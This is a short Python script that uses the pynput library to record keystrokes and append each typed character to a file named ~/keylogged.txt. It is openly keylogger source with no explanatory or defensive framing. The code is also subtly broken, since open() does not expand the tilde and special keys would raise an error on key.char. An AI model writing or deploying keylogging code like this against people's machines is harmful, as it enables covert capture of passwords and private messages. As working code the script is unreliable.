from pynput import keyboard


def on_press(key):
    with open("~/keylogged.txt", 'a') as f:
        f.write(f"{key.char}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()